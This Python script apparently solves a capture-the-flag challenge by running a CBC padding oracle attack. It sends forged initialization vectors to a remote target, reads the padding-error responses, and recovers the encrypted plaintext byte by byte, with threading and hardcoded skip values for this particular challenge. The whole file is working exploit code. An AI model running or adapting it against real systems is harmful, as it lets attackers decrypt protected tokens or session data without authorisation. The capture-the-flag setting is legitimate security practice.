'''
Specific for executing a padding oracle attack. Necessary for solving flag #2.
'''


from help import add2bytes, xor2bytes, make_request, replace_chars
from settings import CBC_BLOCKSIZE, TARGET, USE_THREADS, NUM_OF_BLOCKS, ORIGINAL_PAYLOAD
from base64 import b64encode
from datetime import datetime


# multithreading
from multiprocessing.pool import ThreadPool

def exec_padding_oracle_attack(original_iv: bytes, modifiedDemoData: bytes, plaintext_index: int):
    '''
    Executes the padding oracle attack

    original_iv       : The initialization vector to get the plaintext values
    modifiedDemoData  : The block of data from the original message to append after the proposed IV
    plaintext_index   : It is just to know what block of plaintext was decrypted to properly concatenate them later
    '''
    original_plaintext = ""
    proposed_iv = [b'\x00']*CBC_BLOCKSIZE
    for testing_position in range(-1, -CBC_BLOCKSIZE-1, -1):# Which byte of the IV to test

        byte_cycle = 0

        # # skips
        # # block 1
        if plaintext_index == 0:
            if testing_position == -1:
                byte_cycle = 57
            elif testing_position == -2:
                byte_cycle = 67
            elif testing_position == -3:
                byte_cycle = 130
            elif testing_position == -4:
                byte_cycle = 71
            elif testing_position == -5:
                byte_cycle = 23
            # block 2
        elif plaintext_index == 1:
            if testing_position == -1:
                byte_cycle = 165
            if testing_position == -2:
                byte_cycle = 165
            if testing_position == -3:
                byte_cycle = 165

        while True:
            
            # Propose an IV to send
            proposed_iv_temp = proposed_iv.copy()

            # Change the appropriate byte from 0 to 255
            proposed_iv_temp[testing_position] = add2bytes(
                proposed_iv_temp[testing_position], bytes([byte_cycle])
            )
            proposed_iv_temp = b''.join(proposed_iv_temp)
            
            # Add the rest of the demo data
            payload_temp = proposed_iv_temp + modifiedDemoData

            # Prepare it for the request
            payload_temp = b64encode(payload_temp)
            payload_temp = payload_temp.decode('utf-8')
            payload_temp = replace_chars(payload_temp, reverse=True)
            
            result = make_request(TARGET, payload_temp)

            print(f"\r{plaintext_index}: {byte_cycle: >3} - {str(proposed_iv_temp): <67} - {result}", end='\r')

            if '0' not in result:
                # A propable byte of the IV has been found
                byte_solution = proposed_iv_temp[testing_position:]
                
                # Calculate what valid padding we caused
                caused_valid_padding = bytes([abs(testing_position)]*abs(testing_position))

                # We can now XOR these bytes (or byte) with the padding we caused to get the intermediary byte
                intermediary = xor2bytes(proposed_iv_temp[testing_position:], caused_valid_padding)
                
                original_plaintext = xor2bytes(original_iv[testing_position:], intermediary)
                original_plaintext = original_plaintext.decode('utf-8')

                print(f"\n{plaintext_index}: Caught {byte_solution} while checking position {testing_position}/{-(CBC_BLOCKSIZE-1)}.\nProgress thus far: <{original_plaintext: >{CBC_BLOCKSIZE}}>")

                # Now move on to the next byte, but first make sure to change the byte we found to produce the correct padding on the next try
                if len(caused_valid_padding) > 1:
                    caused_valid_padding = bytes([caused_valid_padding[0]])

                next_valid_padding = add2bytes(caused_valid_padding, b'\x01')*abs(testing_position)
                xor_result = xor2bytes(intermediary, next_valid_padding)
                # Replace the appropriate last bytes of the proposed IV
                for xor_res_byte_ind, xor_res_byte in enumerate(xor_result):
                    # This just puts the bytes we found to the last positions of the <proposed_iv>.
                    # This would be easier if python wasn't a bitch with bytes
                    xor_res_byte_ind = xor_res_byte_ind + testing_position
                    xor_res_byte = bytes([xor_res_byte])
                    proposed_iv[xor_res_byte_ind] = xor_res_byte
                break
            
            byte_cycle = byte_cycle+1
            if byte_cycle>=256:
                # No solution has been found, something is wrong
                raise Exception("All responses were the same. Have you found the error that talks about the padding?")
    

    return plaintext_index, original_plaintext




if USE_THREADS:
    pool = ThreadPool()


plaintext = {}

dtstart = datetime.now()

last_block = NUM_OF_BLOCKS-1
for working_block in range(0, last_block):

    def add_to_rest(result: tuple[int, str]):
        global plaintext
        plaintext.update({result[0]: result[1]})

    original_iv = ORIGINAL_PAYLOAD[
        working_block*CBC_BLOCKSIZE : (working_block+1)*CBC_BLOCKSIZE
    ]

    # Separate a block of data to use in the payload
    modifiedDemoData = ORIGINAL_PAYLOAD[
        (working_block+1)*CBC_BLOCKSIZE : (working_block+2)*CBC_BLOCKSIZE
    ]

    if USE_THREADS:

        pool.apply_async(
            exec_padding_oracle_attack,
            (original_iv, modifiedDemoData, working_block),
            callback=add_to_rest
        )

    else:
        result = exec_padding_oracle_attack(original_iv, modifiedDemoData, working_block)
        add_to_rest(result)


if USE_THREADS:
    pool.close()
    pool.join()



# Combine all the text parts to one string
text = [""]*len(plaintext)

for i in plaintext:
    text[i] = plaintext[i]

text = "".join(text)


print(f"Result:<|{text}|>")


dt = datetime.now() - dtstart
dt = dt.seconds

print(f"It took {dt/60} minutes")
